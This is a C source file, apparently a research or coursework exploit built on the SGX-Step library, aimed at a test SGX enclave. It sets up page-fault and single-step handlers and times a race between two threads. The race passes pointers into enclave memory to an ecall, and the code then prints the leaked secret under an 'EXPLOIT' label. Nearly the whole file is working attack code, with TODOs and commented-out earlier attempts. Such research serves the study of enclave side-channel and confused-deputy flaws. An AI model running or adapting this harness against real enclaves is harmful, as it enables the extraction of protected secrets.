/* utility headers */

#include <sys/mman.h>
#include <signal.h>
#include "sgx-step/libsgxstep/apic.h"
#include "sgx-step/libsgxstep/cpu.h"
#include "sgx-step/libsgxstep/pt.h"
#include "sgx-step/libsgxstep/sched.h"
#include "sgx-step/libsgxstep/elf_parser.h"
#include "sgx-step/libsgxstep/enclave.h"
#include "sgx-step/libsgxstep/debug.h"
#include "sgx-step/libsgxstep/config.h"
#include "sgx-step/libsgxstep/idt.h"
#include "sgx-step/libsgxstep/config.h"
#include "sgx-step/libsgxstep/cache.h"
#include <string.h>  // For memcpy
#include "Enclave/encl_u.h"  // For test_dummy

/* SGX untrusted runtime */
#include <sgx_urts.h>
#include <pthread.h>



#define DO_TIMER_STEP      0
int irq_cnt = 0, do_irq = 0, fault_cnt = 0, trigger_cnt = 0, step_cnt = 0;
uint64_t *pte_encl = NULL, *pte_trigger = NULL, *pmd_encl = NULL;
void *code_adrs, *trigger_adrs;

// THREADING INIT
int turn = 0; // 0 for thread_A, 1 for thread_B
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t cond = PTHREAD_COND_INITIALIZER;
sgx_enclave_id_t create_enclave(void)
{
    sgx_launch_token_t token = {0};
    int updated = 0;
    sgx_enclave_id_t eid = -1;

    info_event("Creating enclave...");
    SGX_ASSERT( sgx_create_enclave( "./Enclave/encl.so", /*debug=*/1,
                                    &token, &updated, &eid, NULL ) );

    return eid;
}
void ocall_print(const char *str)
{
    info("ocall_print: enclave says: '%s'", str);
}

// !!! pointer a has to be uint64_t and not char*
void ocall_print_address(const char *str, uint64_t a)
{
    info("ocall_print_address: enclave says: '%s' '%p'",str, (void*)a);
}
/* ================== ATTACKER IRQ/FAULT HANDLERS ================= */

/* Called before resuming the enclave after an Asynchronous Enclave eXit. */
void aep_cb_func(void)
{
    info("aep");
    step_cnt++;
    printf("stepcnt %d\n", step_cnt);
    uint64_t erip = edbgrd_erip() - (uint64_t) get_enclave_base();
    info("^^ enclave RIP=%#llx", erip);
    
    
    //  0x208d
    if(step_cnt == 11){
        info("testreach");
        sgx_step_do_trap = 0;

        //change thread to writer thread B
        pthread_mutex_lock(&lock);
        turn = 1; // set turn to thread B
        pthread_cond_signal(&cond); // Wake up thread_B
        while(turn != 0){
            pthread_cond_wait(&cond, &lock);
        }
        pthread_mutex_unlock(&lock); //end turn of thread A

    }



}

/* Called upon SIGSEGV caused by untrusted page tables. */
void fault_handler(int signo, siginfo_t * si, void  *ctx)
{

    info("pf handler");

    ucontext_t *uc = (ucontext_t *) ctx;

    switch ( signo )
    {
      case SIGSEGV:
        ASSERT(fault_cnt++ < 10);

        info("Caught page fault (base address=%p)", si->si_addr);
        
    
        if (si->si_addr == trigger_adrs)
        {
            info("Restoring trigger access rights..");
            
            ASSERT(!mprotect(trigger_adrs, 4096, PROT_READ | PROT_EXEC));
            do_irq = 1;

            #if !DO_TIMER_STEP
                sgx_step_do_trap = 1;
            #endif
        }
        else
        {
            info("Unknown #PF address!");
        }
    
        break;

    #if !DO_TIMER_STEP
      case SIGTRAP:
            
        info("Caught single-step trap (RIP=%p)\n", si->si_addr);
        

        /* ensure RFLAGS.TF is clear to disable debug single-stepping */
        uc->uc_mcontext.gregs[REG_EFL] &= ~0x100;
        break;
    #endif

      default:
        info("Caught unknown signal '%d'", signo);
        abort();
    }
}


/* ================== ATTACKER INIT/SETUP ================= */

void register_signal_handler(int signo)
{
    struct sigaction act, old_act;

    /* Specify #PF handler with signinfo arguments */
    memset(&act, 0, sizeof(sigaction));
    act.sa_sigaction = fault_handler;
    act.sa_flags = SA_RESTART | SA_SIGINFO;

    /* Block all signals while the signal is being handled */
    sigfillset(&act.sa_mask);
    ASSERT(!sigaction( signo, &act, &old_act ));
}

/* Configure and check attacker untrusted runtime environment. */
void attacker_config_runtime(void)
{
    ASSERT( !claim_cpu(VICTIM_CPU) );
    //ASSERT( !prepare_system_for_benchmark(PSTATE_PCT) ); //VRAAG in die write(file, w)
    //print_system_settings();

    register_enclave_info();
    print_enclave_info();
    register_signal_handler( SIGSEGV );
}

/* Provoke page fault on enclave entry to initiate single-stepping mode. */
void attacker_config_page_table(void)
{
    code_adrs = get_enclave_base() + get_symbol_offset("ecall_update_response_loc");
    trigger_adrs = (void *)((size_t)code_adrs & ~(4096 - 1));

    info("enclave trigger at %p; code at %p", trigger_adrs, code_adrs);

    
    ASSERT(!mprotect(trigger_adrs, 4096, PROT_NONE ));

    //VRAAG WAT NOG HIER
    
}
// Function for thread A
void* thread_A(void* arg) {



    // locking for turn, sync logic, thread A sleeps until thread B does a page fault
    pthread_mutex_lock(&lock);
    while (turn != 0) { // Wait until it's thread_A's turn
        pthread_cond_wait(&cond, &lock);
    }
    pthread_mutex_unlock(&lock);



    printf("location thread running\n");

    void* encl_base_addr = get_enclave_base();
    info("encl base address: '%p'", encl_base_addr);

    int sum = 1;
    int prod = 2;

    int* sump = &sum;
    int* prodp = &prod;

    struct my_struct ms2 = {sump, prodp};

    // TODO change address so 1 points to address of secret inside enclave
    int* secret_addr = (int*) (encl_base_addr + 0x18000);

    struct my_struct ms = {secret_addr, secret_addr};

    sgx_enclave_id_t eidarg = *(sgx_enclave_id_t*)arg;

    ecall_update_response_loc(eidarg, &ms);

    printf("location thread finished\n");


    
}

// Function for thread B

void* thread_B(void* arg) {


    // locking for turn, sync logic, thread B sleeps until thread A does amount of page fault
    pthread_mutex_lock(&lock);
    while (turn != 1) { // Wait until it's thread_B's turn
        pthread_cond_wait(&cond, &lock);
    }
    pthread_mutex_unlock(&lock);

    printf("writer thread running\n");

    
    sgx_enclave_id_t eidarg = *(sgx_enclave_id_t*)arg;
    ecall_compute_response(eidarg, 2, 4);
    char buffer[64];  // must be large enough to hold the secret or error message
    ecall_get_secret(eidarg, 8, buffer, sizeof(buffer));
    printf("EXPLOIT: %s\n", buffer);


    // CHANGE FROM THREAD B TO THREAD A
    pthread_mutex_lock(&lock);
    turn = 0; // set turn to thread A  
    pthread_cond_signal(&cond); // Wake up thread_A
    while(turn != 1){
        pthread_cond_wait(&cond, &lock);
    }
    pthread_mutex_unlock(&lock); //end turn of thread B
    
    

}

int main( int argc, char **argv )
{

    //Create Enclave
    sgx_enclave_id_t eid = create_enclave();
    int rv = 1, secret = 1;

    /*
    int sum = 1;
    int prod = 2;

    int* sump = &sum;
    int* prodp = &prod;

    struct my_struct ms = {sump, prodp};

    ecall_update_response_loc(eid, &ms);
    ecall_compute_response(eid,5,6);
    ecall_get_response(eid);
    */

    /*
    int sum = 1;
    int prod = 2;

    int* sump = &sum;
    int* prodp = &prod;

    struct my_struct ms2 = {sump, prodp};
    void* encl_base_addr = get_enclave_base();
    // TODO change address so 1 points to address of secret inside enclave
    int* secret_addr = (int*) (encl_base_addr + 0x18000);

    struct my_struct ms = {secret_addr, secret_addr};
    

    ecall_update_response_loc(eid, &ms);
    ecall_compute_response(eid, 2, 4);
    char buffer[64];  // must be large enough to hold the secret or error message
    ecall_get_secret(eid, 8, buffer, sizeof(buffer));
    printf("EXPLOIT: %s\n", buffer);*/

    /* 1. Setup attack execution environment. */
    register_symbols("./Enclave/encl.so");
    attacker_config_runtime();
    attacker_config_page_table();
    register_aep_cb(aep_cb_func);

    register_signal_handler( SIGTRAP );
    set_debug_optin();
    	
    
    do_irq = 0; trigger_cnt = 0, irq_cnt = 0, step_cnt = 0, fault_cnt = 0;
    sgx_step_do_trap = 0;

    // Create 2 threads
    pthread_t t1, t2;
    pthread_create(&t1, NULL, thread_A, (void*)&eid);
    pthread_create(&t2, NULL, thread_B, (void*)&eid);

    pthread_join(t1, NULL);


}

